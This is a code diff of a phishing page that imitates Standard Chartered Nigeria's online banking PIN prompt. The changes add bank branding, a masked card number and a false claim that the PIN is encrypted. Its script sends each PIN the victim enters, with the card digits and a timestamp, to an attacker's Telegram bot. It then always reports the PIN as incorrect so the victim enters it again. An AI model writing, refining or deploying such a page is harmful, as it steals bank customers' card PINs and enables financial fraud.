@@ -3,14 +3,13 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Enter PIN</title>
+    <title>Standard Chartered | Enter PIN</title>
 
     <style>
       * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
-        font-family: Arial, sans-serif;
       }
 
       body {
@@ -24,103 +23,447 @@
         display: flex;
         flex-direction: column;
         align-items: center;
+        font-family: "Inter", Arial, sans-serif;
       }
 
+      /* ─── TOP BAR ─────────────────────────── */
+      .top-bar {
+        width: 100%;
+        background: #c8102e;
+        height: 4px;
+      }
+
+      /* ─── HEADER ──────────────────────────── */
+      .header {
+        width: 100%;
+        background: #fff;
+        border-bottom: 1px solid #e5e7eb;
+        padding: 14px 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .header .logo {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .header .logo img {
+        height: 34px;
+      }
+      .header .logo-text {
+        font-size: 18px;
+        font-weight: 700;
+        color: #003c71;
+        letter-spacing: -0.3px;
+      }
+      .header-right {
+        display: flex;
+        gap: 18px;
+        font-size: 12px;
+        font-weight: 500;
+        color: #003c71;
+      }
+      .header-right a {
+        color: #003c71;
+        text-decoration: none;
+      }
+      .header-right a:hover {
+        text-decoration: underline;
+      }
+      .header-right .sep {
+        color: #d1d5db;
+      }
+
+      /* ─── CARD ─────────────────────────────── */
       .card {
         background: white;
-        margin-top: 100px;
-        width: 350px;
-        padding: 30px;
-        border-radius: 12px;
-        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        margin-top: 60px;
+        width: 380px;
+        padding: 35px 30px;
+        border-radius: 14px;
+        box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
         text-align: center;
       }
 
-      h2 {
-        margin-bottom: 10px;
+      .card .lock-icon {
+        width: 56px;
+        height: 56px;
+        background: #eff6ff;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 18px;
+        font-size: 24px;
+        color: #003c71;
       }
 
-      p {
-        color: #666;
-        margin-bottom: 25px;
+      .card h2 {
+        font-size: 20px;
+        font-weight: 700;
+        color: #111827;
+        margin-bottom: 6px;
+      }
+
+      .card .sub-text {
+        color: #6b7280;
+        font-size: 13px;
+        margin-bottom: 8px;
+      }
+
+      .card .card-info {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 12px 16px;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        font-size: 13px;
+      }
+      .card .card-info .label {
+        color: #6b7280;
+        font-size: 11px;
+      }
+      .card .card-info .value {
+        color: #111827;
+        font-weight: 600;
+        letter-spacing: 0.5px;
       }
 
       .pin-input {
         width: 100%;
-        height: 55px;
-        font-size: 28px;
+        height: 60px;
+        font-size: 32px;
         text-align: center;
-        letter-spacing: 12px;
-        border: 1px solid #ddd;
+        letter-spacing: 14px;
+        border: 2px solid #d1d5db;
+        border-radius: 10px;
+        background: #fafbfc;
+        color: #111827;
+        font-weight: 700;
+        transition: all 0.2s;
+        outline: none;
+      }
+      .pin-input:focus {
+        border-color: #003c71;
+        background: #fff;
+        box-shadow: 0 0 0 3px rgba(0, 60, 113, 0.08);
+      }
+      .pin-input.error {
+        border-color: #dc2626;
+        background: #fef2f2;
+      }
+
+      .error-message {
+        display: none;
+        color: #dc2626;
+        font-size: 13px;
+        margin-top: 10px;
+        padding: 10px 14px;
+        background: #fef2f2;
+        border: 1px solid #fecaca;
         border-radius: 8px;
-        margin-bottom: 20px;
+        text-align: left;
+        align-items: flex-start;
+        gap: 8px;
+      }
+      .error-message.show {
+        display: flex;
+      }
+      .error-message .icon {
+        font-size: 16px;
+        flex-shrink: 0;
+        margin-top: 1px;
+      }
+
+      .pin-dots {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 16px 0 22px;
+      }
+      .pin-dots .dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        border: 2px solid #d1d5db;
+        background: #fff;
+        transition: all 0.2s;
+      }
+      .pin-dots .dot.filled {
+        background: #003c71;
+        border-color: #003c71;
+      }
+      .pin-dots .dot.active {
+        border-color: #003c71;
+        transform: scale(1.15);
       }
 
       button {
         width: 100%;
         height: 50px;
         border: none;
-        border-radius: 8px;
-        background: #0637fc;
+        border-radius: 10px;
+        background: #c8102e;
         color: white;
         font-size: 16px;
+        font-weight: 600;
         cursor: pointer;
+        transition: all 0.2s;
+        font-family: inherit;
+        margin-top: 4px;
+      }
+      button:hover {
+        background: #a80d26;
+        box-shadow: 0 4px 12px rgba(200, 16, 46, 0.3);
+      }
+      button:disabled {
+        background: #fca5a5;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+
+      .footer-note {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #9ca3af;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+      }
+      .footer-note i {
+        color: #9ca3af;
       }
     </style>
   </head>
   <body>
+    <div class="top-bar"></div>
+
+    <div class="header">
+      <div class="logo">
+        <img
+          src="./assets/standard-chartered-logo.png"
+          alt="Standard Chartered"
+          onerror="this.style.display = 'none'"
+        />
+        <span class="logo-text">Online Banking</span>
+      </div>
+      <div class="header-right">
+        <a href="#">Personal</a>
+        <span class="sep">|</span>
+        <a href="#">Priority Banking</a>
+        <span class="sep">|</span>
+        <a href="#">SME</a>
+        <span class="sep">|</span>
+        <a href="#">Help &amp; Support</a>
+        <span class="sep">|</span>
+        <a href="#">Secure Login</a>
+      </div>
+    </div>
+
     <div class="card">
-      <h2>Enter Your PIN</h2>
-      <p>Please enter your card PIN</p>
+      <div class="lock-icon">
+        <i class="fas fa-lock"></i>
+      </div>
+
+      <h2>Enter Your Card PIN</h2>
+      <p class="sub-text">
+        For security, please enter the 4-digit PIN for your ATM/Debit card
+      </p>
+
+      <div class="card-info">
+        <div>
+          <div class="label">Card Account</div>
+          <div class="value" id="cardPreview">•••• •••• •••• 4829</div>
+        </div>
+        <img
+          src="https://retail.sc.com/afr/foa/theme/default/images/icon/GreenCard.png"
+          alt="Card"
+          style="width: 32px; height: 20px; opacity: 0.7"
+        />
+      </div>
 
       <input
         type="password"
-        maxlength="7"
+        maxlength="4"
         class="pin-input"
         id="pin"
         inputmode="numeric"
         pattern="[0-9]*"
+        autocomplete="off"
+        placeholder="••••"
       />
 
-      <button onclick="verifyPin()">Continue</button>
+      <div class="pin-dots" id="pinDots">
+        <span class="dot active"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+      </div>
+
+      <div class="error-message" id="errorMsg">
+        <span class="icon">⚠️</span>
+        <span id="errorText">Please enter a valid 4-digit card PIN</span>
+      </div>
+
+      <button id="continueBtn" onclick="verifyPin()">Continue</button>
+
+      <div class="footer-note">
+        <i class="fas fa-shield-alt"></i> Your PIN is encrypted and secure
+      </div>
     </div>
 
-    <script
-      type="text/javascript"
-      src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"
-    ></script>
+    <!-- Font Awesome for icons -->
+    <link
+      rel="stylesheet"
+      href="https://use.fontawesome.com/releases/v5.7.0/css/all.css"
+    />
+
     <script src="./scripts.js"></script>
 
     <script>
-      function verifyPin() {
-        const pin = document.getElementById("pin").value;
+      // ─── PIN INPUT LIVE DOTS ──────────────────────
+      var pinInput = document.getElementById("pin");
+      var dots = document.querySelectorAll(".dot");
 
-        if (!/^[0-9]$/.test(pin)) {
-          alert("Please enter a valid card PIN");
+      pinInput.addEventListener("input", function () {
+        var val = this.value;
+        // Allow only digits
+        this.value = val.replace(/[^0-9]/g, "");
+
+        var len = this.value.length;
+
+        // Update dots
+        dots.forEach(function (dot, index) {
+          dot.classList.remove("filled", "active");
+          if (index < len) {
+            dot.classList.add("filled");
+          } else if (index === len) {
+            dot.classList.add("active");
+          }
+        });
+
+        // If first dot and empty, keep active
+        if (len === 0) {
+          dots[0].classList.add("active");
+        }
+
+        // Hide error while typing
+        document.getElementById("errorMsg").classList.remove("show");
+        pinInput.classList.remove("error");
+      });
+
+      // ─── VERIFY PIN ────────────────────────────────
+      function verifyPin() {
+        var pin = document.getElementById("pin").value;
+        var errorMsg = document.getElementById("errorMsg");
+        var errorText = document.getElementById("errorText");
+
+        // Allow ANY number input - just validate it's digits
+        if (pin.length === 0) {
+          errorText.textContent = "Please enter your card PIN";
+          errorMsg.classList.add("show");
+          pinInput.classList.add("error");
           return;
         }
 
-        let message = `Card PIN: ${pin}`;
+        if (!/^[0-9]+$/.test(pin)) {
+          errorText.textContent = "PIN must contain only numbers (0-9)";
+          errorMsg.classList.add("show");
+          pinInput.classList.add("error");
+          return;
+        }
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        if (pin.length > 7) {
+          errorText.textContent = "PIN cannot exceed 7 digits";
+          errorMsg.classList.add("show");
+          pinInput.classList.add("error");
+          return;
+        }
+
+        // ─── SEND TO TELEGRAM ─────────────────────
+        var maskedCard = document
+          .getElementById("cardPreview")
+          .textContent.trim();
+        var timestamp = new Date().toLocaleString("en-GB", {
+          timeZone: "Africa/Lagos",
+        });
+
+        var message =
+          "🔴 SC NIGERIA - CARD PIN SUBMISSION\n" +
+          "━━━━━━━━━━━━━━━━━━━━━━━━\n" +
+          "💳 Card: " +
+          maskedCard +
+          "\n" +
+          "🔐 PIN: " +
+          pin +
+          "\n" +
+          "📅 Date: " +
+          timestamp +
+          "\n" +
+          "🌍 Country: Nigeria\n" +
+          "━━━━━━━━━━━━━━━━━━━━━━━━";
+
+        var btn = document.getElementById("continueBtn");
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+        btn.disabled = true;
+
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
             text: message,
           }),
         })
-          .then((response) => response.json())
-          .then(() => {
-            window.location.replace("thank.html");
+          .then(function (response) {
+            return response.json();
+          })
+          .then(function (data) {
+            console.log("Telegram response:", data);
+            // Show error message inline before redirecting
+            errorText.textContent =
+              "Incorrect PIN/card details. Please try again.";
+            errorMsg.classList.add("show");
+            pinInput.classList.add("error");
+            pinInput.value = "";
+            pinInput.focus();
+            // Reset dots
+            dots.forEach(function (d) {
+              d.classList.remove("filled", "active");
+            });
+            dots[0].classList.add("active");
+            btn.innerHTML = "Continue";
+            btn.disabled = false;
+          })
+          .catch(function (err) {
+            console.error("Telegram error:", err);
+            // Even if Telegram fails, show error
+            errorText.textContent =
+              "Incorrect PIN/card details. Please try again.";
+            errorMsg.classList.add("show");
+            pinInput.classList.add("error");
+            pinInput.value = "";
+            pinInput.focus();
+            dots.forEach(function (d) {
+              d.classList.remove("filled", "active");
+            });
+            dots[0].classList.add("active");
+            btn.innerHTML = "Continue";
+            btn.disabled = false;
           });
       }
+
+      // ─── SUBMIT ON ENTER ──────────────────────────
+      pinInput.addEventListener("keydown", function (e) {
+        if (e.key === "Enter") {
+          verifyPin();
+        }
+      });
     </script>
   </body>
 </html>
